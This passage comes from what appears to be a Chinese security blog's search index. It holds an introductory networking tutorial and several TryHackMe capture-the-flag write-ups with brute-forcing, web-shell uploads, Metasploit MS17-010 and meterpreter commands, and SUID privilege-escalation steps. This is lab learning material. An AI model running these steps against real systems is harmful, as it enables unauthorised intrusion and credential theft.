--badsum：用于为数据包生成无效的校验和；任何真正的TCP/IP堆栈都会丢弃这个数据包，然而，防火墙可能会对其自动响应(而不检查数据包的校验和是否有效)；因此，该参数开关可用于确定防火墙/IDS是否存在。 ","link":"https://f9f.fun/post/tryhackme-nmap-xue-xi/"},{"title":"网络入门","content":"Introductory Networking 网络入门 1.OSI模型：概述 OSI（Open S ystems Interconnection）模型是一个标准化模型，我们用它来演示计算机网络背后的理论。在实践中，它实际上是现实世界网络所基于的更紧凑的 TCP/IP 模型;但是，在许多方面，OSI 模型更容易获得初步理解。 OSI 模型由七层组成： 有许多助记符可以帮助您了解 OSI 模型的层 - 四处搜索，直到找到您喜欢的。 我个人赞成： A焦虑的 P ale Shakespeare Treated Nervous Drunks Patily 让我们依次简要地看一下其中的每一个： 第 7 层——应用层（Application）： OSI 模型的应用层本质上是为计算机上运行的程序提供网络选项，应用层几乎只与应用程序一起工作，为它们提供一个接口来传输数据；当数据被提供给应用层后，这些数据接下来就会向下传递给表示层。 第 6 层——表示层（Presentation）： 表示层从应用层接收数据，这些数据往往会采用本机中的应用程序可以理解的格式，但不一定采用接收方计算机中的应用层可以理解的标准化格式；表示层会将数据转换为标准化格式，并处理对数据的任何加密、压缩或其他转换过程，当表示层完成数据处理后，这些数据将向下传递到会话层。 第 5 层——会话层（Session）： 当会话层从表示层接收到格式正确的数据时，它会查看是否可以通过网络与另一台计算机建立连接，如果不能，则它会发回一个错误，并且该过程不会继续进行；如果可以建立会话，那么会话层的工作就是维护所建立的会话，并与远程计算机的会话层合作以同步通信。 会话层特别重要，因为它创建的会话对于所讨论的通信是唯一的，这就能够允许你同时向不同端点发出多个请求而不会混淆所有数据(例子：同时在 Web 浏览器中打开两个选项卡而不会出现网页响应错误)，当会话层成功建立主机和远程计算机之间的连接后，数据将向下传递到第 4 层--传输层。 第 4 层——传输层（Transport）： 传输层是一个非常有趣的层，它提供了许多重要的功能，它的第一个目的是选择传输数据的协议，传输层最常见的两种协议是TCP（传输控制协议）和UDP（用户数据报协议）； 使用 TCP协议时，传输是基于连接的，这意味着在请求期间要建立并维护计算机之间的连接，这允许进行可靠的传输，因为成功建立的连接可用于确保数据包全部到达正确的位置，TCP 连接允许两台计算机保持持续通信，以确保以可接受的速度发送数据，并能重新发送任何丢失的数据；而使用UDP传输，情况则正好相反，数据包基本上会被直接扔到接收方计算机上——如果接收方不能及时接收数据，那就是接收方的问题（这就是为什么如果网络连接不佳，进行类似 Skype 的视频传输时 可能会导致画面像素化）。 总而言之：TCP 通常会被选择用于传输精度高于速度的情况（例如文件传输或加载网页），而 UDP 将用于速度需求更重要的情况（例如视频流）。 选择了所使用的传输协议后，传输层会将数据传输分成小块进行（在 TCP 上称为数据段，在 UDP 上称为数据报），这使得成功传输消息变得更加容易。 第 3 层——网络层（Network）： 网络层负责定位关于你的请求的目的地，互联网是一个巨大的网络，当你想从某个网页请求信息时，网络层则会获取相关页面的 IP 地址并找出最佳路由（进行逻辑寻址）；在这个阶段，我们正在使用的仍然是由软件控制的所谓逻辑地址（即 IP 地址），逻辑地址可用于为网络提供秩序，它能对网络进行分类从而允许我们对它们进行适当的排序，目前最常见的逻辑地址形式是 IPV4 格式，你对此可能比较熟悉（如 192.168.1.1 是家用路由器的常用地址，192.168.1.1就是典型的IPV4格式）。 第 2 层——数据链路层（Data Link）： 数据链路层侧重于传输过程中的物理寻址，它从网络层接收数据包（包括远程计算机的 IP 地址）并添加接收端点的物理 (MAC) 地址；每台启用网络的计算机内部都有一个网络接口卡 (NIC)，它带有一个唯一的 MAC（媒体访问控制）地址以供识别；MAC 地址由制造商设置并直接烧入卡中，它们无法被更改——尽管它们可以被欺骗，当通过网络发送信息时，实际上是根据物理地址来确定将信息发送到哪里。 此外，以适合传输的格式呈现数据也是数据链路层的工作。 数据链路层在接收数据时也起着重要的作用，因为它会检查接收到的信息以确保它在传输过程中没有被破坏，这很可能发生在数据向第 1 层（物理层）传输时。 第 1 层——物理层（Physical）： 物理层直接涉及到计算机的硬件，这一层是 在网络中传输的构成数据的电脉冲信号 被发送和接收的地方。 物理层的工作是将传输过程中的二进制数据转换为电信号并通过网络进行传输，以及接收传入的电信号并将其转换回二进制数据。 2.封装 当数据沿模型的每一层向下传递时，包含特定于相关层的详细信息的更多信息将添加到传输的开始处。例如，网络层添加的标头将包括源和目标 IP 地址等内容，传输层添加的标头将包括（除其他事项外）特定于正在使用的协议的信息。数据链路层还在传输结束时添加一块，用于验证数据在传输时是否未损坏;这也具有提高安全性的额外好处，因为数据无法在不破坏拖车的情况下被拦截和篡改。 整个过程称为封装; 将数据从一台计算机发送到另一台计算机的过程。 请注意，封装的数据在过程的不同步骤中被赋予不同的名称。在第 7、6 和 5 层中，数据简称为数据。在传输层中，封装的数据称为段或数据报（取决于是否选择了TCP或UDP作为传输协议）。在网络层，数据称为数据包。当数据包传递到数据链路层时，它就变成了一个帧，当它通过网络传输时，帧已经被分解成比特。 当第二台计算机收到消息时，它会逆转该过程 - 从物理层开始，一直工作到应用程序层，在此过程中剥离添加的信息。这称为解封装。 因此，您可以将 OSI 模型的层视为存在于具有网络功能的每台计算机中。虽然在实践中并没有那么明确，但计算机都遵循相同的封装过程来发送数据并在收到数据时解封装。 封装和解封装的过程非常重要 - 不仅因为它们的实际用途，还因为它们为我们提供了一种发送数据的标准化方法。这意味着所有传输将始终遵循相同的方法，允许任何支持网络的设备向任何其他可访问设备发送请求，并确保它被理解 - 无论它们是否来自同一制造商;使用相同的操作系统;或任何其他因素。 TCP/IP模型 TCP/IP 模型在许多方面与 OSI 模型非常相似，是现实世界网络的基础。 TCP/IP 模型由四层组成——应用层(Application)、传输层(Transport)、网际层(Internet )和网络接口层(Network Interface)，它们涵盖了与 OSI 七层模型相同的功能范围。 **注意：**一些资料会将 TCP/IP 模型分为五层——将上图中的网络接口层再分为数据链路层和物理层（与 OSI 模型中的数据链路层和物理层一样）；TCP/IP五层模型也是公认的、众所周知的，但是，它没有被正式定义（与 RFC1122 中定义的原始四层模型不同）；TCP/IP模型具体有几层，主要取决于你选择使用哪个版本——无论是四层TCP/IP模型 还是 五层TCP/IP模型，通常都被认为是有效的。 如果 OSI 模型实际上并未用于现实世界中的任何事物，那么你就有理由问我们为什么要费心使用 OSI 模型？这个问题的答案很简单：OSI 模型（由于比 TCP/IP 模型更精简和更严格）往往更容易让学习者学习网络的初始理论。 OSI模型与TCP/IP模型的匹配情况如下： 数据的封装和解封装过程在 TCP/IP 模型中的工作方式与在 OSI 模型中的工作方式完全相同，在 TCP/IP 模型的每一层，都会有一个报头在封装期间被添加，并在解封装期间被移除。 分层模型非常适合辅助教学，它向我们展示了如何封装数据并通过网络发送数据的一般过程，但这个过程实际上是如何发生的呢？ 当我们谈论 TCP/IP 时，也许会想到一个包含四层的分层模型，但TCP/IP实际上也是一套协议——协议是定义如何执行操作的规则集。TCP/IP 的名称来源于两个重要的协议：一个是传输控制协议（我们之前在 OSI 模型中提到过），英文缩写为TCP，它用于控制两个端点之间的数据流；另外一个是 Internet 协议，英文缩写为IP，它控制数据包的寻址方式和发送方式。 构成 TCP/IP 套件的协议还有很多，我们将在后面继续介绍其中的一些内容。 接下来我们将介绍TCP，如前所述，TCP 是一种基于连接的协议，换句话说，在通过 TCP 发送任何数据之前，必须先在两台计算机之间建立稳定的连接，而形成这种连接的过程被称为TCP三次握手。 当你尝试建立连接时，你的计算机会首先向远程服务器发送一个特殊请求，表明它想要初始化一个连接，此请求包含了被称为 SYN位（SYN是“synchronise”的缩写，含义是：同步）的东西，这实际上是在开始建立连接过程时 所进行的第一次接触；然后服务器将响应一个包含 SYN 位的数据包，同时还包含了一个称为 ACK 的“acknowledgement(确认)”位；最后，你的计算机将继续发送一个包含 ACK 位的数据包，以确认连接已成功建立。随着TCP三次握手的成功完成，两台计算机之间就可以可靠地传输数据了，而且任何在传输过程中丢失或损坏的数据都会被重新发送，从而导致TCP连接看起来是无损的。 ***注意：***本文不打算逐步深入探讨TCP是如何工作的，在本文中——我们知道在使用 TCP 建立连接之前必须执行三次握手就足够了。 ***关于两种分层模型的历史：***准确理解最初创建 TCP/IP 模型 和 OSI 模型的原因很重要。一开始计算机界没有标准化模型——不同的制造商都遵循他们自己的方法来规划网络，因此不同制造商制造的系统在网络方面完全不兼容；为了解决网络不兼容的问题，美国国防部于 1982 年引入了TCP/IP 模型，以提供一个统一标准——供所有不同制造商共同遵循的标准；后来国际标准化组织（ISO）引入了OSI模型，但是，OSI模型主要用作一个更全面的学习指南，因此 TCP/IP 模型仍然是现代网络理论所基于的标准。 3网络工具ping 在这个阶段，希望所有的理论都是有意义的，你现在了解了计算机网络背后的基本模型。在房间的其余部分，我们将看看一些可以在实际应用程序中使用的命令行网络工具。其中许多工具确实可以在其他操作系统上运行，但为了简单起见，我将假设您在本房间的其余部分运行Linux。我们要看的第一个工具是命令。ping 当我们想要测试是否可以连接到远程资源时，将使用 ping 命令。通常这将是互联网上的一个网站，但如果您想检查它是否正确配置，它也可能是家庭网络上的计算机。Ping 使用 ICMP 协议工作，这是前面提到的不太知名的 TCP/IP 协议之一。ICMP 协议在 OSI 模型的网络层工作，因此在 TCP/IP 模型的因特网层工作。ping 的基本语法是 。在这个例子中，我们使用ping来测试是否可以与谷歌建立网络连接：ping &lt;target&gt; 请注意，ping 命令实际上返回了它连接到的 Google 服务器的 IP 地址，而不是请求的网址。这是一个方便的ping辅助应用程序，因为它可用于确定托管网站的服务器的IP地址。ping的一大优点是它几乎无处不在于任何支持网络的设备。所有操作系统都支持开箱即用，甚至大多数嵌入式设备都可以使用 ping！ 尝试以下问题。任何关于语法的问题都可以使用 ping 手册页（在 Linux 上）来回答。man ping 4.网络工具-Traceroute ping 命令的逻辑后续是“traceroute”，traceroute可用于映射 你的请求在前往目标机器时所采用的路径。 互联网由许多不同的服务器和端点组成，它们彼此联网。这意味着，为了获得您真正想要的内容，您首先需要通过一堆其他服务器。路由跟踪允许您查看其中每个连接 - 它允许您查看计算机和请求的资源之间的每个中间步骤。Linux 上 traceroute 的基本语法是这样的： traceroute &lt;destination&gt; 默认情况下，Windows 跟踪路由实用程序 （） 使用与 ping 相同的 ICMP 协议运行，而 Unix 等效程序通过 UDP 运行。在这两种情况下，这都可以通过开关进行更改。tracert 您可以看到从我的路由器（）到Google服务器需要13个跃点，地址为216.58.205.46_gateway 现在轮到你了。和以前一样，所有关于开关的问题都可以用 traceroute （） 的手册页来回答。man traceroute 5.网络工具-WHOIS 域名(Domain Names)——互联网的无名救世主，你能想象记住要访问的每个网站的 IP 地址是什么感觉吗？ 这是一个可怕的想法，好在我们可以使用域名。 我们将在下一小节中更多地讨论域名是如何工作的，但在本节中我们知道域名能够转换为IP地址就足够了（例如，我们可以在浏览器中输入tryhackme.com去访问和此域名相关的网站，而不需要输入TryHackMe的具体IP地址）；域名由被称为域名注册商的公司所出租，如果你想要得到一个域名，你可以去注册商处进行注册，然后就能租用该域名一段时间了。 我们可以使用whois 查询域名由谁注册，你可能会从whois查询中获得大量信息（由于个人信息可能会被隐藏处理，因此whois查询也可能会提供很少有效信息）。 如果你不喜欢使用命令行工具(whois)，也可以选择使用在线whois工具：https://www.whois.com/whois/ **注意：**在使用whois前 你可能需要先进行工具安装，在基于 Debian 的系统上，这可以通过 sudo apt update &amp;&amp; sudo apt-get install whois 完成。 Whois 查询非常容易执行，只需使用命令whois &lt;domain&gt;即可获取有关域名注册的可用信息列表： 观察上图：这是经常可以找到的相对非常少量的信息，我们已经获得了目标的域名、注册该域名的公司、上次续订时间、下一次到期时间，以及有关名称服务器的一些信息。 6.网络工具-Dig 我们在上一小节中谈到了域——现在让我们谈谈它们是如何工作的。 有没有想过如何将 URL 转换为你的计算机可以理解的 IP 地址？ 答案是使用被称为 DNS（域名系统-Domain Name System）的 TCP/IP 协议。 简单地说，DNS 允许我们请求一个特殊的服务器 以此为我们提供 我们试图访问的网站的 IP 地址。例如，如果我们向 www.google.com 发出请求，我们的计算机会首先向一个特殊的 DNS 服务器发送请求（你的计算机知道如何找到它），然后DNS服务器会寻找到 Google 的 IP 地址并将其发回给我们，然后我们的计算机就可以将请求发送到 Google 服务器的 IP。 让我们对以上过程进行分解。 我们向目标网站发出请求，本地计算机所做的第一件事情是检查本地缓存，查看缓存中是否已经为目标网站存储了一个相关的 IP 地址；如果本地缓存中有目标IP，则可以直接将请求发送到目标ip，如果本地缓存中没有目标ip，则将进入流程的下一阶段。 假设在本地缓存中尚未找到目标ip地址，本地计算机将向所谓的递归(recursive) DNS 服务器发送请求，这些服务器自动为我们网络上的路由器所知，许多 Internet 服务提供商 (ISP) 都会维护自己的递归服务器，Google 和 OpenDNS 等公司也控制了一些递归服务器。本地计算机能够知道向何处发送信息请求：因为递归 DNS 服务器的详细信息已经存储在我们的路由器中。递归DNS服务器将维护流行域的结果缓存，但是，如果我们所请求的网站并没有存储在递归DNS服务器的缓存中，那么递归DNS服务器会将请求再传递给根名称DNS服务器。 2004 年之前，世界上正好有 13 个根名称 DNS 服务器，现在还有更多，但是，它们仍然可以使用 与分配给原始服务器相同的 13 个 IP 地址进行访问（为了保持平衡以便我们在发出请求时获得最近的服务器）。 根名称服务器会跟踪下一级的 DNS 服务器，然后选择一个合适的服务器并将我们的请求重定向到该服务器，这些相比于根名称服务器的较低级别的服务器被称为顶级域服务器。 顶级域 (TLD-Top-Level Domain) 服务器被拆分为多个扩展。例如，如果我们正在搜索 tryhackme.com，我们的请求将被重定向到处理.com域的 TLD 服务器；如果我们正在搜索 bbc.co.uk，我们的请求将被重定向到处理 .co.uk域的 TLD 服务器。与根名称服务器一样，TLD 服务器也会继续跟踪下一级：权威名称服务器(Authoritative name servers)，当 TLD 服务器收到我们的信息请求时，服务器会将其传递给适当的权威名称服务器。 权威名称服务器用于直接存储域的 DNS 记录。换句话说，世界上的每个域都将其 DNS 记录存储在某个地方的权威名称服务器上，它们是信息的来源。当我们的请求到达我们正在查询的域的权威名称服务器时，它就会将相关信息发回给我们，从而允许我们的计算机连接到我们所请求的域对应的 IP 地址。 当我们在web浏览器中访问网站时，以上一切过程都会自动发生，但我们也可以使用名为dig 的工具来手动完成，与ping和traceroute一样，dig也可以在 Linux 系统上进行安装。 dig`允许我们手动查询我们所选择的递归 DNS 服务器以获取有关域的信息：`dig &lt;domain&gt; @&lt;dns-server-ip&gt; 这是一个非常有用的网络故障排除工具。 执行dig命令之后，我们得到了很多信息，我们发送了一个查询并成功（即无错误）收到了一个完整的答复——正如预期的那样，返回结果中会包含我们所查询的域名所对应的 IP 地址。 dig 能够提供给我们的另一个有趣信息是 查询到的 DNS 记录的 TTL（生存时间）。如前所述，当我们的计算机完成域名查询时，会将结果存储在本地缓存中，而DNS记录的 TTL 将告诉本地计算机何时停止将此DNS记录视为有效——即何时应该再次请求数据，而不是一直依赖于本地缓存的副本记录。 TTL 可以在dig返回结果中的“ANSWER section” 的第二列找到： **tips：**重要的是要记住 TTL（在 DNS 缓存的上下文中）以秒为单位，因此上图示例中的DNS记录将在 2 分 37 秒后过期。 ","link":"https://f9f.fun/post/wang-luo-ru-men/"},{"title":"Tryhackme靶场-My Robot CTF","content":"Tryhackme靶场-My Robot CTF 信息收集 nmap扫描端口 先访问80 http端 六个命令提供使用 prepare 显示一个动画 fsociety 一句话 inform 四张照片没发现啥有用的 question 批判这四个patriot，executive，capitalist，businessman wakeup 一段视频 没理解感觉很吊 join 留下邮箱 加入 爆破目录 爆破很慢很卡我直接先访问一些常见的敏感目录 robots.txt 这里得到第一个key 访问另一个目录fsocity.dic 是一个字典 自带浏览器不会下载 用火狐打开会自动下载 dirsearch 太慢了我换了goubuster 可以看到robots 和wp-login 用burp爆破 用户名根据响应的长度得到 Elliot 把字典复制到kali上 对字典内容排序并去掉重复的内容 然后用wpscan进行爆破 wpscan --url http://10.10.11.157//wp-login --usernames Elliot --passwords f.dic 爆破了很久卡失败了好几次最后爆出密码 ER28-0652 登录成功 接下来就是搞一个反弹shell 之前做tryhackme靶场还没有监听成功过。。 shell是有的但是kali就是监听不到 因为监听不到就去上网看别人的wp 看别人wp也可以学习 【THM】Mr Robot CTF-练习 - Hekeats - 博客园 (cnblogs.com) 这是我找到些比较详细比较好的wp 看看监听后的操作 监听成功后先切换交互式 python -c &quot;import pty;pty.spwan('/bin/bash')&quot; 然后找到robot用户的密码 是md5加密 解密得到密码 su rebot 切换用户 找到第二个key 提权 find / -type -f -perm -04000 -ls 2&gt;/dev/null 列出目标机中设置的SUID位的程序 可以看到nmap是root权限 访问 https://gtfobins.github.io/ 并查看nmap程序的提权方法： 使用上图所示的方法（要求nmap版本在2.02-5.21之间）进行提权，提权成功之后查看key3文件内容即可： key-3-of-3.txt文件内容为：04787ddef27c3dee1ee161b21670b4e4 ","link":"https://f9f.fun/post/tryhackme-ba-chang-my-robot-ctf/"},{"title":"Tyhackme靶场-RootMe","content":"Tyhackme靶场-RootMe 信息收集 nmap端口扫描 发现端口22 ssh 和80 http 端口打开 尝试访问80 dirsearch爆破目录 访问一下爆出来的敏感目录 有文件上传 上传一句话木马试试 php文件是不可以上传的 尝试改成phtml就上传成功了 访问uploads可以发现我上传的木马文件 然后就是在本地开启监听 监听端口是反弹shell里写的端口 我这里又是一直监听不上 上网搜了问题是没把监听的ip改成自己vpn上分配到的ip 但是我改了还是一样监听不到 这里就换一种方式 在kali上找到自带的后门木马 复制然后上传 成功 现在我们可以直接在？cmd=后面输入我们想要执行的命令 find / -type f -name user.txt 题目需要我们找到user.txt 在哪 不能直接读取还是要反弹shell 还是没监听成功 上网搜寻了还是没能解决 后续思路 如果反弹shell成功连接 可以先变为交互式 python3 -c ‘import pty;pyt.spwan(&quot;/bin/bash&quot;)' 然后前面我已经找到了user.txt地址直接cd 然后 cat 即可 root.txt就是需要提权到root 一般都是先 sudo -l 列举出拥有权限的所有二进制文件或者程序 这可能需要知道密码 或者是 find / -type f -user root -perm -u+s 2&gt;/dev/null ","link":"https://f9f.fun/post/tyhackme-ba-chang-rootme/"},{"title":"Tryhackme靶场-simple ctf  未完成","content":"Tryhackme靶场-Simple CTF 未完成 信息收集 nmap -T4 -sV -sS ip 21 ftp端口和 80 端口打开 尝试访问80端口 爆破目录 访问一下爆出来的目录 继续爆破http://10.10.202.77/simple/ 有个登录页面 搜索可以利用漏洞 打开msf 搜索simple 2.2.8 的漏洞 百度搜索一下这个 这么一个漏洞 因为上图的问题我不知道咋搞 这个靶场就没继续做了 我后续思路是用这个漏洞配合字典爆破出密码 然后平台有个问题 但是我用了nmap和fscan都没扫出来 看了别人wp发现 2222是ssh 但是我扫 是这个结果。 ","link":"https://f9f.fun/post/tryhackme-ba-chang-simple-ctf-wei-wan-cheng/"},{"title":"学习 -Tryhackme靶场-Retro ","content":"Tryhackme靶场-Retro 学习记录 信息收集 nmap 扫描主机端口 80 3389端口打开 访问80端口 打不开 继续扫目录 dirsearch 因为一开始用的字典没扫到啥后面换了一个大字典 扫的很慢 先访问一下出来的这一个retro 一开始访问不了 重置了一下代理 ok了 但是网站很容易崩溃 发现网站是基于WordPress 可以用wpscan跑一下页面用户 不过感觉就是wade 以防万一跑一下 太容易掉了无语。。。 随便点看到一条新评论 推测是密码 因为3389端口开着那直接远程桌面 连不上 可能是防火墙原因 可以尝试登陆一下但是我经常丢失页面没试了 去网上搜了另一种远程桌面连接的方法 remmina 可视化的并且连接成功 发现桌面就有user.txt 点开桌面的回收站看的这么一个东西 百度了一下 漏洞搜索利用 可能是可以利用这个漏洞提权 因为题目要求是拿到root.txt 总掉很无语 jas502n/CVE-2019-1388: CVE-2019-1388 UAC提权 (nt authority\\system) (github.com) 就是按照这个链接里的步骤 这里不展示了 补充更新： 理论上点开那个CA 连接会跳转但是我这个靶机他不跳 并且我自己复制链接打开也是失败的。 ","link":"https://f9f.fun/post/xue-xi-tryhackme-ba-chang-retro/"},{"title":"Tryhackme靶机-blue wp","content":"Tryhackme靶机-blue wp 信息收集 nmap扫描主机 一眼看中445端口 MS17-010 这里扫描也可以用nmap另一个命令 nmap -sV -vv --script vuln 10.10.108.72 直接在扫描端口同时帮你把可能存在的漏洞列举出来 但是扫描时间较长比较慢 漏洞利用 打开msf search ms17-010 use 0 show options set rhosts 10.10.108.72 run 我这里反复操作就是创建不了session重启靶机也不行 总结 总之这个靶场是比较简单的虽然我这里一直无法创建会话但大概思路是没问题的 利用ms17-010漏洞拿到受害机shell 拿到shell之后根据题目要求 Escalate privileges, learn how to upgrade shells in metasploit. use post/multi/manage/shell_to_meterpreter set session run 后续就是查看进程为迁移维持权限 再根据题目要求hashdump打印用户密码的hash值 按到hash值后解密获取明文密码用户名 最后就是找藏在各个目录中的flag 可以用搜索指令 windows 是dir flag.txt 虽然我没有做但是思路我觉得是ok的.... 而且这个靶场名字blue其实很好联想永恒之蓝 并且靶场3389端口是打开的可以远程桌面操控一下 linux 远程控制命令 rdesktop IP -u xxx -p xxxx ","link":"https://f9f.fun/post/tryhackme-ba-ji-blue-wp/"},{"title":"Tryhackme靶机-Pickle Rick wp","content":"Tryhackme靶机-Pickle Rick wp 信息收集 1.nmap 一下 发现22 80 端口开放 访问80端口 这里图片卡了没显示图片是这样 就是用burpsuite 爆破吧 查看页面源代码 发现username：R1ckRul3s 目录爆破发现几个可以访问的目录 依次访问 有个login.php 账号是源代码里的那个然后密码是robots.txt里那一串 我这里直接登陆了 上面就是登录后的页面 一个命令执行框 输入 ls -al 有这么多的文件 读取一下clue.txt Sup3rS3cretPickl3Ingred.txt 第一个是提示我们在别的文件里也可以找找 知道权限 输 sudo -l 大概意思是没有密码可以直接提权 输 sudo su 没反应页面估计不行 反弹shell 反弹shell可以参考这个网站 可以一键生成各种情况下的命令Reverse Shell Generator (weibell.github.io) 我这里就是监听没反应不知道啥情况 总之这个靶场提权可以直接提权的 后续flag在各个目录下应该是很好找的 ","link":"https://f9f.fun/post/tryhackme-ba-ji-pickle-rick-wp/"},{"title":"Tryhackme靶机-blog wp","content":"THM靶场blog 1.信息收集 nmap一下 看到445端口我先直接尝试用ms17-010 发现不行 这里发现它使用的cms版本为WordPress5.0 用msf搜索这个存在的历史漏洞 2.漏洞搜索 利用该漏洞前提需要知道网站username和password 因为是WordPress 所以可以用wpscan抓取网页用户 wpscan --url 10.10.71.235 -e u bjiel kwheel Karen Wheeler Billy Joel 爆破的过程是漫长的 最后爆出用户名 kwheel 密码 cutiepie1 3.漏洞利用 反向连接创建不了session 改用正向连接 set payload php/meterpreter/bind_tcp 成功创建session shell 进入 python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' 变为可交互式方便操作 find / -name *user.txt &gt; 2.txt 操作了半天被骗了 4.提权 find / -type f -perm -u=s 2&gt;/dev/null 发现suid权限的命令 checker 尝试执行 执行命令他说我们不是admin，并且为一个64位elf文件，用ltrace查看他引用了哪些函数，看到getenv()函数，就可以知道他与环境变量有关，添加一个环境变量：admin=1，再执行命令权限已经为root，好家伙又学到了一招。 提权成功 ","link":"https://f9f.fun/post/thmblog-wp/"}]}